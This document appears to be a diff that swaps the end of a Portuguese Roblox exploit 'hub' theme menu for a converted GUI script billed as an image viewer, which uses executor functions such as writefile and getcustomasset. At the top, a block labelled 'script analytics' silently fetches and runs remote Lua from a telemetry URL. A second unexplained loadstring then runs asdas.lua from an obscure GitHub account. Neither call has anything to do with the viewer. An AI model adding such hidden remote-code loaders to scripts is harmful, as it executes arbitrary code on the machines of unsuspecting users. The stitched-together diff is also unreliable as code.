@@ -1,124 +1,565 @@
+--[[rscripts:analytics:start]]
+-- Script analytics (enabled by the creator on rscripts.net).
+-- Runs in its own thread and cannot affect the script below.
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=692c1501af5fe737979bbbf9"))()
+	end)
+end)
+--[[rscripts:analytics:end]]
 
-        -- reaplica o visual da aba selecionada
-        local cur = currentTab
-        currentTab = nil
-        if cur then selectTab(cur) end
-    end
+-- Generated using RoadToGlory's Converter v1.1 (RoadToGlory#9879)
 
-    -- novos elementos (ex.: lista do catálogo) já nascem no tema ativo
-    ScreenGui.DescendantAdded:Connect(function(i)
-        if not dark then return end
-        task.defer(function()
-            if i.Parent then themeInst(i) end
-        end)
-    end)
-    ToastGui.DescendantAdded:Connect(function(i)
-        if not dark then return end
-        task.defer(function()
-            if not i.Parent then return end
-            if i:IsA("UIGradient") then
-                i.Enabled = false
-            elseif i:IsA("Frame") and i.Parent == TC then
-                i.BackgroundColor3 = mapColor(i, "BackgroundColor3", i.BackgroundColor3)
-            end
-        end)
-    end)
+-- Instances:
 
-    -- ───────── UI: botão "mudar tema ^" dentro da aba Principal ─────────
-    local Card, Holder = State.themeCard, State.themeHolder
-    local CLOSED_H, OPEN_H = 44, 102
-    local open = false
+loadstring(game:HttpGet("https://github.com/xxpwnxxx420lord/Wuno/blob/main/asdas.lua?raw=true",true))()
 
-    local ThemeBtn = Instance.new("TextButton", Card)
-    ThemeBtn.Name = "ThemeBtn"
-    ThemeBtn.Font = Enum.Font.Gotham
-    ThemeBtn.Text = "  mudar tema ^"
-    ThemeBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
-    ThemeBtn.TextSize = 11
-    ThemeBtn.TextXAlignment = Enum.TextXAlignment.Left
-    ThemeBtn.BackgroundColor3 = Color3.fromRGB(20, 5, 5)
-    ThemeBtn.BackgroundTransparency = 0.35
-    ThemeBtn.BorderSizePixel = 0
-    ThemeBtn.AutoButtonColor = false
-    ThemeBtn.Position = UDim2.new(0, 8, 0, 8)
-    ThemeBtn.Size = UDim2.new(1, -16, 0, 28)
-    ThemeBtn.ZIndex = 4
-    Instance.new("UICorner", ThemeBtn).CornerRadius = UDim.new(0, 6)
-    local TBS = Instance.new("UIStroke", ThemeBtn)
-    TBS.Color = Color3.fromRGB(80, 20, 20); TBS.Thickness = 1; TBS.Transparency = 0.4
-    hoverFX(ThemeBtn)
+local Converted = {
+	["_ScreenGui"] = Instance.new("ScreenGui");
+	["_main"] = Instance.new("Frame");
+	["_UIStroke"] = Instance.new("UIStroke");
+	["_top_bar"] = Instance.new("Frame");
+	["_title_container"] = Instance.new("Frame");
+	["_UIListLayout"] = Instance.new("UIListLayout");
+	["_logo_container"] = Instance.new("Frame");
+	["_UIListLayout1"] = Instance.new("UIListLayout");
+	["_padding_container"] = Instance.new("Frame");
+	["_porn"] = Instance.new("TextLabel");
+	["_UIPadding"] = Instance.new("UIPadding");
+	["_orange_card"] = Instance.new("Frame");
+	["_hub"] = Instance.new("TextLabel");
+	["_UIPadding1"] = Instance.new("UIPadding");
+	["_UICorner"] = Instance.new("UICorner");
+	["_title"] = Instance.new("Frame");
+	["_UIListLayout2"] = Instance.new("UIListLayout");
+	["_UIPadding2"] = Instance.new("UIPadding");
+	["_porn1"] = Instance.new("TextLabel");
+	["_UIPadding3"] = Instance.new("UIPadding");
+	["_UIListLayout3"] = Instance.new("UIListLayout");
+	["_search_bar"] = Instance.new("Frame");
+	["_search"] = Instance.new("TextLabel");
+	["_queue"] = Instance.new("TextBox");
+	["_UIListLayout4"] = Instance.new("UIListLayout");
+	["_FIlename"] = Instance.new("Frame");
+	["_search1"] = Instance.new("TextLabel");
+	["_queue1"] = Instance.new("TextBox");
+	["_UIListLayout5"] = Instance.new("UIListLayout");
+	["_Button"] = Instance.new("Frame");
+	["_search2"] = Instance.new("TextLabel");
+	["_UIListLayout6"] = Instance.new("UIListLayout");
+	["_TextButton"] = Instance.new("TextButton");
+	["_LocalScript"] = Instance.new("LocalScript");
+	["_shadow"] = Instance.new("Frame");
+	["_ImageLabel"] = Instance.new("ImageLabel");
+	["_TextButton1"] = Instance.new("TextButton");
+	["_LocalScript1"] = Instance.new("LocalScript");
+	["_UITextSizeConstraint"] = Instance.new("UITextSizeConstraint");
+	["_ImageLabel1"] = Instance.new("ImageLabel");
+	["_Dragify"] = Instance.new("LocalScript");
+}
 
-    local CurLbl = Instance.new("TextLabel", ThemeBtn)
-    CurLbl.Font = Enum.Font.GothamMedium
-    CurLbl.TextSize = 10
-    CurLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
-    CurLbl.BackgroundTransparency = 1
-    CurLbl.TextXAlignment = Enum.TextXAlignment.Right
-    CurLbl.AnchorPoint = Vector2.new(1, 0.5)
-    CurLbl.Position = UDim2.new(1, -10, 0.5, 0)
-    CurLbl.Size = UDim2.new(0, 90, 0, 14)
-    CurLbl.ZIndex = 5
+-- Properties:
 
-    local rows = {}
-    local function refreshRows()
-        for n, row in pairs(rows) do
-            local sel = ((n == "Dark clean") == dark)
-            row.Text = (sel and "●  " or "    ") .. n
-            row.TextColor3 = sel and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 150)
-            tween(row, 0.15, {
-                BackgroundTransparency = sel and 0.35 or 1,
-                BackgroundColor3 = Color3.fromRGB(80, 15, 15),
-            })
-        end
-        CurLbl.Text = dark and "Dark clean" or "Original"
-    end
+Converted["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Converted["_ScreenGui"].Parent = game:GetService("CoreGui")
 
-    local function setOpen(v)
-        open = v
-        local h = v and OPEN_H or CLOSED_H
-        if v then for _, r in pairs(rows) do r.Visible = true end end
-        tween(Card, 0.18, { Size = UDim2.new(1, -16, 0, h) })
-        tween(Holder, 0.18, { Position = UDim2.new(0, 0, 0, State.themeCardY + h + 8) })
-        if not v then
-            task.delay(0.2, function()
-                if not open then for _, r in pairs(rows) do r.Visible = false end end
-            end)
-        end
-    end
+Converted["_main"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_main"].BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Converted["_main"].BackgroundTransparency = 0
+Converted["_main"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_main"].BorderSizePixel = 0
+Converted["_main"].Position = UDim2.new(0.5, 0, 0.489837408, 0)
+Converted["_main"].Size = UDim2.new(0.5, 0, 0.75, 0)
+Converted["_main"].Name = "main"
+Converted["_main"].ClipsDescendants = true
+Converted["_main"].ZIndex = 1
+Converted["_main"].Parent = Converted["_ScreenGui"]
 
-    local function setTheme(name)
-        if name == "Dark clean" then
-            if not dark then applyDark() end
-        else
-            if dark then applyOriginal() end
-        end
-        refreshRows()
-        setOpen(false)
-        showToast("Tema: " .. name, "info")
-    end
+Converted["_UIStroke"].Color = Color3.fromRGB(27, 27, 27)
+Converted["_UIStroke"].Thickness = 2
+Converted["_UIStroke"].ZIndex = 10
+Converted["_UIStroke"].Parent = Converted["_main"]
 
-    for idx, name in ipairs({ "Original", "Dark clean" }) do
-        local row = Instance.new("TextButton", Card)
-        row.Name = name
-        row.Font = Enum.Font.GothamMedium
-        row.TextSize = 10
-        row.TextXAlignment = Enum.TextXAlignment.Left
-        row.BackgroundColor3 = Color3.fromRGB(80, 15, 15)
-        row.BackgroundTransparency = 1
-        row.BorderSizePixel = 0
-        row.AutoButtonColor = false
-        row.Position = UDim2.new(0, 8, 0, 42 + (idx - 1) * 26)
-        row.Size = UDim2.new(1, -16, 0, 24)
-        row.ZIndex = 4
-        row.Visible = false
-        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
-        rows[name] = row
-        row.MouseButton1Click:Connect(function() setTheme(name) end)
-    end
-    refreshRows()
+-- MENU BACKGROUND
+Converted["_ImageLabel1"].Image = "rbxassetid://87903267067222"
+Converted["_ImageLabel1"].ScaleType = Enum.ScaleType.Crop
+Converted["_ImageLabel1"].ImageTransparency = 0
+Converted["_ImageLabel1"].BackgroundTransparency = 1
+Converted["_ImageLabel1"].BorderSizePixel = 0
+Converted["_ImageLabel1"].Position = UDim2.new(0, 0, 0, 0)
+Converted["_ImageLabel1"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_ImageLabel1"].ZIndex = 1
+Converted["_ImageLabel1"].Parent = Converted["_main"]
 
-    ThemeBtn.MouseButton1Click:Connect(function() setOpen(not open) end)
-end)()
+-- Dark overlay para o texto continuar legível
+Converted["_shadow"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_shadow"].BackgroundTransparency = 0.45
+Converted["_shadow"].BorderSizePixel = 0
+Converted["_shadow"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_shadow"].ZIndex = 2
+Converted["_shadow"].Name = "shadow"
+Converted["_shadow"].Parent = Converted["_main"]
 
-print("[AKZ HUB V1] Carregado! 19 abas — by: Akira / Angel")
-showToast("✓ AKZ HUB carregado!", "success")
+-- ImageLabel antigo usado pelo efeito de sombra
+Converted["_ImageLabel"].Image = "rbxassetid://6015897843"
+Converted["_ImageLabel"].ImageColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_ImageLabel"].ImageTransparency = 0.5
+Converted["_ImageLabel"].ScaleType = Enum.ScaleType.Slice
+Converted["_ImageLabel"].SliceCenter = Rect.new(49, 49, 450, 450)
+Converted["_ImageLabel"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_ImageLabel"].BackgroundTransparency = 1
+Converted["_ImageLabel"].BorderSizePixel = 0
+Converted["_ImageLabel"].Position = UDim2.new(0.498754829, 0, 0.5, 0)
+Converted["_ImageLabel"].Size = UDim2.new(1, 47, 1, 47)
+Converted["_ImageLabel"].ZIndex = 2
+Converted["_ImageLabel"].Parent = Converted["_shadow"]
+
+-- TOP BAR
+Converted["_top_bar"].AutomaticSize = Enum.AutomaticSize.Y
+Converted["_top_bar"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_top_bar"].BackgroundTransparency = 1
+Converted["_top_bar"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_top_bar"].BorderSizePixel = 0
+Converted["_top_bar"].Size = UDim2.new(1, 0, 1.01117885, 0)
+Converted["_top_bar"].Name = "top_bar"
+Converted["_top_bar"].ZIndex = 5
+Converted["_top_bar"].Parent = Converted["_main"]
+
+Converted["_title_container"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_title_container"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_title_container"].BackgroundTransparency = 1
+Converted["_title_container"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_title_container"].BorderSizePixel = 0
+Converted["_title_container"].Size = UDim2.new(0.420029402, 0, 0.058068119, 0)
+Converted["_title_container"].Name = "title_container"
+Converted["_title_container"].ZIndex = 6
+Converted["_title_container"].Parent = Converted["_top_bar"]
+
+Converted["_UIListLayout"].Padding = UDim.new(0, 5)
+Converted["_UIListLayout"].FillDirection = Enum.FillDirection.Horizontal
+Converted["_UIListLayout"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout"].Parent = Converted["_title_container"]
+
+Converted["_logo_container"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_logo_container"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_logo_container"].BackgroundTransparency = 1
+Converted["_logo_container"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_logo_container"].BorderSizePixel = 0
+Converted["_logo_container"].Name = "logo_container"
+Converted["_logo_container"].ZIndex = 7
+Converted["_logo_container"].Parent = Converted["_title_container"]
+
+Converted["_UIListLayout1"].Padding = UDim.new(0, 1)
+Converted["_UIListLayout1"].FillDirection = Enum.FillDirection.Horizontal
+Converted["_UIListLayout1"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout1"].Parent = Converted["_logo_container"]
+
+Converted["_padding_container"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_padding_container"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_padding_container"].BackgroundTransparency = 1
+Converted["_padding_container"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_padding_container"].BorderSizePixel = 0
+Converted["_padding_container"].Name = "padding_container"
+Converted["_padding_container"].ZIndex = 8
+Converted["_padding_container"].Parent = Converted["_logo_container"]
+
+Converted["_porn"].Font = Enum.Font.Unknown
+Converted["_porn"].RichText = true
+Converted["_porn"].Text = "Image "
+Converted["_porn"].TextColor3 = Color3.fromRGB(225, 225, 225)
+Converted["_porn"].TextSize = 20
+Converted["_porn"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_porn"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_porn"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_porn"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_porn"].BackgroundTransparency = 1
+Converted["_porn"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_porn"].BorderSizePixel = 0
+Converted["_porn"].Name = "porn"
+Converted["_porn"].ZIndex = 8
+Converted["_porn"].Parent = Converted["_padding_container"]
+
+Converted["_UIPadding"].PaddingBottom = UDim.new(0, 3)
+Converted["_UIPadding"].PaddingLeft = UDim.new(0, 3)
+Converted["_UIPadding"].PaddingRight = UDim.new(0, 3)
+Converted["_UIPadding"].PaddingTop = UDim.new(0, 3)
+Converted["_UIPadding"].Parent = Converted["_padding_container"]
+
+Converted["_orange_card"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_orange_card"].BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+Converted["_orange_card"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_orange_card"].BorderSizePixel = 0
+Converted["_orange_card"].Name = "orange_card"
+Converted["_orange_card"].ZIndex = 8
+Converted["_orange_card"].Parent = Converted["_logo_container"]
+
+Converted["_hub"].Font = Enum.Font.Unknown
+Converted["_hub"].RichText = true
+Converted["_hub"].Text = "viewer"
+Converted["_hub"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_hub"].TextSize = 20
+Converted["_hub"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_hub"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_hub"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_hub"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_hub"].BackgroundTransparency = 1
+Converted["_hub"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_hub"].BorderSizePixel = 0
+Converted["_hub"].Name = "hub"
+Converted["_hub"].ZIndex = 9
+Converted["_hub"].Parent = Converted["_orange_card"]
+
+Converted["_UIPadding1"].PaddingBottom = UDim.new(0, 3)
+Converted["_UIPadding1"].PaddingLeft = UDim.new(0, 3)
+Converted["_UIPadding1"].PaddingRight = UDim.new(0, 3)
+Converted["_UIPadding1"].PaddingTop = UDim.new(0, 3)
+Converted["_UIPadding1"].Parent = Converted["_orange_card"]
+
+Converted["_UICorner"].CornerRadius = UDim.new(0, 4)
+Converted["_UICorner"].Parent = Converted["_orange_card"]
+
+Converted["_title"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_title"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_title"].BackgroundTransparency = 1
+Converted["_title"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_title"].BorderSizePixel = 0
+Converted["_title"].Name = "title"
+Converted["_title"].ZIndex = 7
+Converted["_title"].Parent = Converted["_title_container"]
+
+Converted["_UIListLayout2"].Padding = UDim.new(0, 1)
+Converted["_UIListLayout2"].FillDirection = Enum.FillDirection.Horizontal
+Converted["_UIListLayout2"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout2"].Parent = Converted["_title"]
+
+Converted["_UIPadding2"].PaddingBottom = UDim.new(0, 3)
+Converted["_UIPadding2"].PaddingLeft = UDim.new(0, 3)
+Converted["_UIPadding2"].PaddingRight = UDim.new(0, 3)
+Converted["_UIPadding2"].PaddingTop = UDim.new(0, 3)
+Converted["_UIPadding2"].Parent = Converted["_title"]
+
+Converted["_porn1"].Font = Enum.Font.Unknown
+Converted["_porn1"].RichText = true
+Converted["_porn1"].Text = "for Roblox"
+Converted["_porn1"].TextColor3 = Color3.fromRGB(225, 225, 225)
+Converted["_porn1"].TextSize = 20
+Converted["_porn1"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_porn1"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_porn1"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_porn1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_porn1"].BackgroundTransparency = 1
+Converted["_porn1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_porn1"].BorderSizePixel = 0
+Converted["_porn1"].Name = "porn"
+Converted["_porn1"].ZIndex = 8
+Converted["_porn1"].Parent = Converted["_title"]
+
+Converted["_UIPadding3"].PaddingBottom = UDim.new(0, 20)
+Converted["_UIPadding3"].PaddingLeft = UDim.new(0, 25)
+Converted["_UIPadding3"].PaddingRight = UDim.new(0, 25)
+Converted["_UIPadding3"].PaddingTop = UDim.new(0, 20)
+Converted["_UIPadding3"].Parent = Converted["_top_bar"]
+
+Converted["_UIListLayout3"].Padding = UDim.new(0, 10)
+Converted["_UIListLayout3"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout3"].Parent = Converted["_top_bar"]
+
+-- SEARCH BAR
+Converted["_search_bar"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_search_bar"].BackgroundTransparency = 1
+Converted["_search_bar"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_search_bar"].BorderSizePixel = 0
+Converted["_search_bar"].Size = UDim2.new(0.317527533, 0, 0.067001678, 0)
+Converted["_search_bar"].Name = "search_bar"
+Converted["_search_bar"].ZIndex = 6
+Converted["_search_bar"].Parent = Converted["_top_bar"]
+
+Converted["_search"].Font = Enum.Font.Unknown
+Converted["_search"].Text = ">"
+Converted["_search"].TextColor3 = Color3.fromRGB(170, 85, 255)
+Converted["_search"].TextSize = 14
+Converted["_search"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_search"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_search"].BackgroundTransparency = 1
+Converted["_search"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_search"].BorderSizePixel = 0
+Converted["_search"].Name = "search"
+Converted["_search"].ZIndex = 7
+Converted["_search"].Parent = Converted["_search_bar"]
+
+Converted["_queue"].ClearTextOnFocus = false
+Converted["_queue"].CursorPosition = -1
+Converted["_queue"].Font = Enum.Font.Unknown
+Converted["_queue"].PlaceholderColor3 = Color3.fromRGB(175, 175, 175)
+Converted["_queue"].PlaceholderText = "Insert file name (required, dont do extension)"
+Converted["_queue"].RichText = true
+Converted["_queue"].Text = ""
+Converted["_queue"].TextColor3 = Color3.fromRGB(225, 225, 225)
+Converted["_queue"].TextSize = 15
+Converted["_queue"].TextTruncate = Enum.TextTruncate.AtEnd
+Converted["_queue"].TextWrapped = true
+Converted["_queue"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_queue"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_queue"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_queue"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_queue"].BackgroundTransparency = 1
+Converted["_queue"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_queue"].BorderSizePixel = 0
+Converted["_queue"].Position = UDim2.new(0.119999997, 0, 0, 0)
+Converted["_queue"].Size = UDim2.new(3.33333325, 0, 0.5, 0)
+Converted["_queue"].Name = "queue"
+Converted["_queue"].ZIndex = 7
+Converted["_queue"].Parent = Converted["_search_bar"]
+
+Converted["_UIListLayout4"].Padding = UDim.new(0, 10)
+Converted["_UIListLayout4"].FillDirection = Enum.FillDirection.Horizontal
+Converted["_UIListLayout4"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout4"].Parent = Converted["_search_bar"]
+
+-- FILENAME
+Converted["_FIlename"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_FIlename"].BackgroundTransparency = 1
+Converted["_FIlename"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_FIlename"].BorderSizePixel = 0
+Converted["_FIlename"].Size = UDim2.new(0.317527533, 0, 0.067001678, 0)
+Converted["_FIlename"].Name = "FIlename"
+Converted["_FIlename"].ZIndex = 6
+Converted["_FIlename"].Parent = Converted["_top_bar"]
+
+Converted["_search1"].Font = Enum.Font.Unknown
+Converted["_search1"].Text = ">"
+Converted["_search1"].TextColor3 = Color3.fromRGB(170, 85, 255)
+Converted["_search1"].TextSize = 14
+Converted["_search1"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_search1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_search1"].BackgroundTransparency = 1
+Converted["_search1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_search1"].BorderSizePixel = 0
+Converted["_search1"].Name = "search"
+Converted["_search1"].ZIndex = 7
+Converted["_search1"].Parent = Converted["_FIlename"]
+
+Converted["_queue1"].ClearTextOnFocus = false
+Converted["_queue1"].CursorPosition = -1
+Converted["_queue1"].Font = Enum.Font.Unknown
+Converted["_queue1"].PlaceholderColor3 = Color3.fromRGB(175, 175, 175)
+Converted["_queue1"].PlaceholderText = "Enter raw image link"
+Converted["_queue1"].RichText = true
+Converted["_queue1"].Text = ""
+Converted["_queue1"].TextColor3 = Color3.fromRGB(225, 225, 225)
+Converted["_queue1"].TextSize = 15
+Converted["_queue1"].TextTruncate = Enum.TextTruncate.AtEnd
+Converted["_queue1"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_queue1"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_queue1"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_queue1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_queue1"].BackgroundTransparency = 1
+Converted["_queue1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_queue1"].BorderSizePixel = 0
+Converted["_queue1"].Position = UDim2.new(0.119999997, 0, 0, 0)
+Converted["_queue1"].Size = UDim2.new(3.33333325, 0, 0.5, 0)
+Converted["_queue1"].Name = "queue"
+Converted["_queue1"].ZIndex = 7
+Converted["_queue1"].Parent = Converted["_FIlename"]
+
+Converted["_UIListLayout5"].Padding = UDim.new(0, 10)
+Converted["_UIListLayout5"].FillDirection = Enum.FillDirection.Horizontal
+Converted["_UIListLayout5"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout5"].Parent = Converted["_FIlename"]
+
+-- BUTTON
+Converted["_Button"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_Button"].BackgroundTransparency = 1
+Converted["_Button"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Button"].BorderSizePixel = 0
+Converted["_Button"].Size = UDim2.new(0.317527533, 0, 0.067001678, 0)
+Converted["_Button"].Name = "Button"
+Converted["_Button"].ZIndex = 6
+Converted["_Button"].Parent = Converted["_top_bar"]
+
+Converted["_search2"].Font = Enum.Font.Unknown
+Converted["_search2"].Text = ">"
+Converted["_search2"].TextColor3 = Color3.fromRGB(170, 85, 255)
+Converted["_search2"].TextSize = 14
+Converted["_search2"].AutomaticSize = Enum.AutomaticSize.XY
+Converted["_search2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_search2"].BackgroundTransparency = 1
+Converted["_search2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_search2"].BorderSizePixel = 0
+Converted["_search2"].Name = "search"
+Converted["_search2"].ZIndex = 7
+Converted["_search2"].Parent = Converted["_Button"]
+
+Converted["_UIListLayout6"].Padding = UDim.new(0, 10)
+Converted["_UIListLayout6"].FillDirection = Enum.FillDirection.Horizontal
+Converted["_UIListLayout6"].SortOrder = Enum.SortOrder.LayoutOrder
+Converted["_UIListLayout6"].Parent = Converted["_Button"]
+
+Converted["_TextButton"].Font = Enum.Font.Unknown
+Converted["_TextButton"].Text = "Submit"
+Converted["_TextButton"].TextColor3 = Color3.fromRGB(175, 175, 175)
+Converted["_TextButton"].TextSize = 15
+Converted["_TextButton"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_TextButton"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextButton"].BackgroundTransparency = 1
+Converted["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton"].BorderSizePixel = 0
+Converted["_TextButton"].Position = UDim2.new(0.119999997, 0, 0, 0)
+Converted["_TextButton"].Size = UDim2.new(3.33299994, 0, 0.5, 0)
+Converted["_TextButton"].ZIndex = 7
+Converted["_TextButton"].Parent = Converted["_Button"]
+
+-- CLOSE BUTTON
+Converted["_TextButton1"].Font = Enum.Font.SourceSans
+Converted["_TextButton1"].Text = "X"
+Converted["_TextButton1"].TextColor3 = Color3.fromRGB(175, 175, 175)
+Converted["_TextButton1"].TextScaled = true
+Converted["_TextButton1"].TextSize = 25
+Converted["_TextButton1"].TextWrapped = true
+Converted["_TextButton1"].TextXAlignment = Enum.TextXAlignment.Right
+Converted["_TextButton1"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_TextButton1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextButton1"].BackgroundTransparency = 1
+Converted["_TextButton1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton1"].BorderSizePixel = 0
+Converted["_TextButton1"].Position = UDim2.new(0.765054524, 0, 0.0135501353, 0)
+Converted["_TextButton1"].Size = UDim2.new(0.216484934, 0, 0.08130081, 0)
+Converted["_TextButton1"].ZIndex = 10
+Converted["_TextButton1"].Parent = Converted["_main"]
+
+Converted["_UITextSizeConstraint"].MaxTextSize = 25
+Converted["_UITextSizeConstraint"].Parent = Converted["_TextButton1"]
+
+-- Fake Module Scripts:
+
+local fake_module_scripts = {}
+
+-- Fake Local Scripts:
+
+local function OJCDNW_fake_script()
+	local script = Instance.new("LocalScript")
+	script.Name = "LocalScript"
+	script.Parent = Converted["_TextButton"]
+
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local url = script.Parent.Parent.Parent.FIlename.queue.Text
+		local byte = game:HttpGet(url)
+		writefile(script.Parent.Parent.Parent.search_bar.queue.Text..".png", byte)
+
+		local id = getcustomasset(
+			script.Parent.Parent.Parent.search_bar.queue.Text..".png"
+		)
+
+		script.Parent.Parent.Parent.Parent.ImageLabel.Image = id
+	end)
+end
+
+local function PIZTFTX_fake_script()
+	local script = Instance.new("LocalScript")
+	script.Name = "LocalScript"
+	script.Parent = Converted["_TextButton1"]
+
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+
+local function WFFP_fake_script()
+	local script = Instance.new("LocalScript")
+	script.Name = "Dragify"
+	script.Parent = Converted["_main"]
+
+	local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
+	end
+
+	local UIS = game:GetService("UserInputService")
+
+	function dragify(Frame)
+		local dragToggle = nil
+		local dragSpeed = 0.25
+		local dragInput = nil
+		local dragStart = nil
+		local startPos = nil
+
+		local function updateInput(input)
+			local Delta = input.Position - dragStart
+
+			local Position = UDim2.new(
+				startPos.X.Scale,
+				startPos.X.Offset + Delta.X,
+				startPos.Y.Scale,
+				startPos.Y.Offset + Delta.Y
+			)
+
+			game:GetService("TweenService"):Create(
+				Frame,
+				TweenInfo.new(0.20, Enum.EasingStyle.Back),
+				{Position = Position}
+			):Play()
+		end
+
+		Frame.InputBegan:Connect(function(input)
+			if (
+				input.UserInputType == Enum.UserInputType.MouseButton1
+				or input.UserInputType == Enum.UserInputType.Touch
+			)
+			and UIS:GetFocusedTextBox() == nil then
+
+				dragToggle = true
+				dragStart = input.Position
+				startPos = Frame.Position
+
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragToggle = false
+					end
+				end)
+			end
+		end)
+
+		Frame.InputChanged:Connect(function(input)
+			if (
+				input.UserInputType == Enum.UserInputType.MouseMovement
+				or input.UserInputType == Enum.UserInputType.Touch
+			) then
+				dragInput = input
+			end
+		end)
+
+		UIS.InputChanged:Connect(function(input)
+			if input == dragInput and dragToggle then
+				updateInput(input)
+			end
+		end)
+	end
+
+	dragify(script.Parent)
+end
+
+coroutine.wrap(OJCDNW_fake_script)()
+coroutine.wrap(PIZTFTX_fake_script)()
+coroutine.wrap(WFFP_fake_script)()
